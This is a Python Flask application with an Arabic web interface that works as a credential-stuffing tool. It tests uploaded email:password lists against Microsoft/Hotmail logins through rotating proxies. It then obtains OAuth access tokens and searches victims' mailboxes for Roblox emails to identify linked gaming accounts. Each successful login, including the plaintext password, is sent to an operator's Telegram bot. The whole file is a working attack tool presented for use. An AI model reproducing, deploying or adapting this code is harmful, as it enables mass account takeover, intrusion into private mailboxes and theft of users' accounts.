import os
import time
import threading
import random
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "logs": [],
    "bot_token": "",
    "chat_id": "",
    "workers": 20,
    "proxies": []
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()

def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 300:
            STATE["logs"] = STATE["logs"][-300:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])

def send_telegram(text):
    token, chat = STATE["bot_token"], STATE["chat_id"]
    if not token or not chat:
        return
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={
            "chat_id": chat, 
            "text": text, 
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=5)
    except Exception:
        pass

def get_user_id(username, proxies=None):
    try:
        r = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": False},
            timeout=10, proxies=proxies
        )
        if r.status_code == 200 and r.json().get("data"):
            return r.json()["data"][0]["id"]
    except Exception:
        pass
    return None

def get_csrf(proxies=None):
    s = requests.Session()
    if proxies: s.proxies = proxies
    try:
        r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
        return r.headers.get("x-csrf-token"), s
    except Exception:
        return None, None

def get_asset_names(asset_ids, proxies=None):
    if not asset_ids: return []
    token, session = get_csrf(proxies)
    if not token: return []
    try:
        items = [{"itemType": "Asset", "id": int(a)} for a in asset_ids]
        r = session.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
        if r.status_code == 200:
            return [i.get("name", "Unknown") for i in r.json().get("data", [])]
    except Exception:
        pass
    return []

def get_roblox_data(username, proxies=None):
    uid = get_user_id(username, proxies)
    if not uid: return None
    try:
        user = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10, proxies=proxies).json()
        friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10, proxies=proxies).json()
        wearing = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", timeout=10, proxies=proxies).json()
        names = get_asset_names(wearing.get("assetIds", []), proxies)
        return {
            "username": username,
            "friends": friends.get("count", 0),
            "banned": "Yes" if user.get("isBanned", False) else "No",
            "created": (user.get("created") or "").split("T")[0] or "Unknown",
            "profile": f"https://www.roblox.com/users/{uid}/profile",
            "wearing": names,
        }
    except Exception:
        return None

def extract_roblox_user(text):
    import re
    patterns = [r"account:\s*([a-zA-Z0-9_]+)", r"for\s+([a-zA-Z0-9_]+)\s+and", r"for\s+([a-zA-Z0-9_]+)\."]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m: return m.group(1)
    return None

def check_hotmail(email, password, proxies=None):
    s = requests.Session()
    if proxies: s.proxies = proxies
    try:
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        r = s.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True, timeout=15)
        
        import re
        ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
        if not ppft: return None
        urlpost = re.search(r'"urlPost":"([^"]+)"', r.text)
        if not urlpost: return None
        
        data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft.group(1)}&PPSX=Passport&NewUser=1"
        post = s.post(urlpost.group(1), data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
        
        if "__Host-MSAAUTHP" not in s.cookies.get_dict(): return None
        
        code = None
        loc = post.headers.get("Location", "")
        if "code=" in loc: code = loc.split("code=")[1].split("&")[0]
        if not code: return None
        
        tok = requests.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data={
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            },
            timeout=30, proxies=proxies
        )
        if tok.status_code != 200: return None
        at = tok.json().get("access_token")
        if not at: return None
        
        cid = s.cookies.get("MSPCID", "").upper()
        if not cid: return None
        
        search = requests.post(
            "https://outlook.live.com/search/api/v2/query",
            json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]},
            headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"},
            timeout=30, proxies=proxies
        )
        if search.status_code != 200: return None
        
        uname = extract_roblox_user(search.text)
        if not uname: return None
        
        rb = get_roblox_data(uname, proxies)
        if not rb: return None
        
        return {"email": email, "password": password, "roblox": rb}
    except Exception:
        return None

def parse_proxy(p):
    if not p: return None
    try:
        if "@" in p:
            cred, ipport = p.split("@", 1)
            u, pw = cred.split(":", 1)
            ip, port = ipport.split(":", 1)
            url = f"http://{u}:{pw}@{ip}:{port}"
        else:
            ip, port = p.split(":", 1)
            url = f"http://{ip}:{port}"
        return {"http": url, "https": url}
    except Exception:
        return None

def worker(combo_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        
        with LOCK:
            STATE["stats"]["processed"] += 1
            
        try:
            if ":" not in combo:
                combo_queue.task_done()
                continue
            email, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue
            
        proxies = None
        with LOCK:
            if STATE["proxies"]:
                proxies = random.choice(STATE["proxies"])
                
        result = check_hotmail(email, password, proxies)
        
        with LOCK:
            if result:
                STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1
                
        if result:
            rb = result["roblox"]
            log(f"HIT → {email} | {rb['username']}")
            msg = f"<b>✅ ROBLOX HIT!</b>\n\n📧 <b>Email:</b> <code>{result['email']}</code>\n🔑 <b>Pass:</b> <code>{result['password']}</code>\n👤 <b>User:</b> <code>{rb['username']}</code>\n🔗 <a href='{rb['profile']}'>View Profile</a>"
            send_telegram(msg)
        else:
            log(f"BAD → {email}")
            
        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()

def run_checker(combos, workers):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q = Queue()
    
    for c in combos:
        combo_q.put(c)
        
    send_telegram(f"<b>🚀 بدأ صيد روبلوكس!</b>\n\n📁 <b>عدد الحسابات:</b> <code>{len(combos)}</code>\n⚙️ <b>الثريدات:</b> <code>{workers}</code>\n🌐 <b>بروكسيات:</b> <code>{len(STATE['proxies'])}</code>")
    log(f"بدأ الفحص لـ {len(combos)} حساب...")
    
    threads = []
    for _ in range(min(workers, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    STATE["running"] = False
    log(f"خلصنا! صيد: {STATE['stats']['hits']} | خربان: {STATE['stats']['bad']}")
    send_telegram(f"<b>🏁 انتهى الصيد!</b>\n\n✅ <b>Hits:</b> {STATE['stats']['hits']}\n❌ <b>Bad:</b> {STATE['stats']['bad']}")

INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --panel:#0d140d; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:800px; margin:0 auto; padding:20px; }
  h1 { font-size:20px; text-align:center; margin-bottom:20px; text-shadow: 0 0 10px var(--fg); }
  
  .settings { display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:15px; }
  .settings input, .settings select {
    background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
    padding: 10px; border-radius: 5px; font-family: inherit; width: 100%;
  }
  .settings input:focus, .settings select:focus { outline: none; border-color: var(--fg); }
  
  .proxy-area { margin-bottom: 15px; }
  .proxy-area textarea {
    width: 100%; background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
    padding: 10px; border-radius: 5px; font-family: inherit; min-height: 60px; resize: vertical;
  }

  .upload-box {
    border: 2px dashed var(--dim); padding: 30px 20px; text-align: center;
    border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
    display: block; width: 100%; background: var(--panel);
  }
  .upload-box:hover { border-color: var(--fg); background: rgba(57, 255, 20, 0.05); }
  .upload-box input[type="file"] { display: none; }
  .upload-box span { font-size: 16px; pointer-events: none; display: block; color: #aaa; }
  .upload-box:hover span { color: var(--fg); }

  .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; background: var(--panel); }
  .stat b { display:block; font-size:22px; margin-top:5px; }
  .stat.hits b { color: var(--fg); text-shadow: 0 0 5px var(--fg); }
  .stat.bad b { color: #ff4444; }

  .term {
    background:#000; border:1px solid var(--dim); padding:15px;
    height:300px; overflow-y:auto; font-size:13px; line-height:1.6;
    white-space:pre-wrap; word-break:break-all; border-radius:5px;
  }
  .hit { color:var(--fg); font-weight:bold; }
  .bad { color:#ff4444; opacity: 0.7; }
  .sys { color:#00ffff; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ ROBLOX CHECKER</h1>
  
  <div class="settings">
    <input type="password" id="bot_token" placeholder="Bot Token (تيليجرام)">
    <input type="text" id="chat_id" placeholder="Chat ID (المعرف)">
  </div>
  <div class="settings">
    <input type="number" id="workers" value="20" min="1" max="100" placeholder="عدد الثريدات (Workers)">
  </div>
  
  <div class="proxy-area">
    <textarea id="proxies" placeholder="ضع البروكسيات هنا (سطر لكل بروكسي)&#10;ip:port&#10;user:pass@ip:port"></textarea>
  </div>

  <label class="upload-box" id="drop-zone">
    <input type="file" id="file-input" accept=".txt">
    <span id="upload-text">📁 اضغط هنا لاختيار ملف الكومبو وبدء الصيد فوراً</span>
  </label>

  <div class="stats">
    <div class="stat">Total <b id="s-total">0</b></div>
    <div class="stat">Processed <b id="s-proc">0</b></div>
    <div class="stat hits">Hits <b id="s-hits">0</b></div>
    <div class="stat bad" style="display:none;">Bad <b id="s-bad">0</b></div>
  </div>

  <div class="term" id="term">> بانتظار الملف...<br>> ضع الإعدادات والبروكسيات (إن وجدت) ثم ارفع الملف.</div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");
const fileInput = document.getElementById("file-input");
const uploadText = document.getElementById("upload-text");

function append(cls, text) {
  const div = document.createElement("div");
  div.className = cls;
  div.textContent = text;
  term.appendChild(div);
  term.scrollTop = term.scrollHeight;
}

fileInput.addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  
  const token = document.getElementById("bot_token").value.trim();
  const chat = document.getElementById("chat_id").value.trim();
  const workers = parseInt(document.getElementById("workers").value) || 20;
  const proxies = document.getElementById("proxies").value.split("\n").map(x => x.trim()).filter(Boolean);
  
  if (!token || !chat) {
    append("bad", "!! تنبيه: ما حطيت التوكن أو الايدي، البوت ما راح يرسل النتائج.");
  }
  if (proxies.length === 0) {
    append("bad", "!! تنبيه: ما حطيت بروكسيات، راح ينحظر الآي بي وتطلع كلها BAD.");
  }

  uploadText.textContent = "⏳ جاري رفع الملف وبدء الصيد...";
  append("sys", `> تم اختيار الملف: ${file.name} (${Math.round(file.size / 1024)} KB)`);
  
  const formData = new FormData();
  formData.append("file", file);
  formData.append("bot_token", token);
  formData.append("chat_id", chat);
  formData.append("workers", workers);
  formData.append("proxies", JSON.stringify(proxies));
  
  try {
    const r = await fetch("/api/upload", { method: "POST", body: formData });
    const j = await r.json();
    if (j.ok) {
      uploadText.textContent = "✅ جاري الصيد الآن...";
      append("sys", `> السيرفر قرأ الملف (${j.total} حساب) وبدأ الشغل.`);
    } else {
      append("bad", "!! خطأ: " + j.error);
      uploadText.textContent = "❌ فشل الرفع، جرب مرة ثانية";
    }
  } catch (err) {
    append("bad", "!! فشل الاتصال بالسيرفر");
    uploadText.textContent = "❌ خطأ في الاتصال";
  }
});

socket.on("log", d => {
  let cls = "";
  if (d.line.includes("HIT")) cls = "hit";
  if (d.line.includes("BAD")) cls = "bad";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-total").textContent = s.total;
  document.getElementById("s-proc").textContent = s.processed;
  document.getElementById("s-hits").textContent = s.hits;
  
  if (s.processed >= s.total && s.total > 0) {
    uploadText.textContent = "✅ خلص الصيد! تقدر ترفع ملف جديد.";
  }
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "الفحص شغال حالياً، انتظر يخلص"}), 400
        
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "ما وصل ملف"}), 400
        
    file = request.files["file"]
    if file.filename == "":
        return jsonify({"ok": False, "error": "اسم الملف فاضي"}), 400
        
    STATE["bot_token"] = request.form.get("bot_token", "")
    STATE["chat_id"] = request.form.get("chat_id", "")
    workers = int(request.form.get("workers", 20))
    
    try:
        raw_proxies = json.loads(request.form.get("proxies", "[]"))
        STATE["proxies"] = [parse_proxy(p) for p in raw_proxies if parse_proxy(p)]
    except:
        STATE["proxies"] = []
        
    try:
        content = file.read().decode("utf-8", errors="ignore")
        combos = [line.strip() for line in content.splitlines() if ":" in line]
        
        if not combos:
            return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (email:pass)"}), 400
            
        threading.Thread(target=run_checker, args=(combos, workers), daemon=True).start()
        return jsonify({"ok": True, "total": len(combos)})
        
    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في قراءة الملف: {str(e)}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
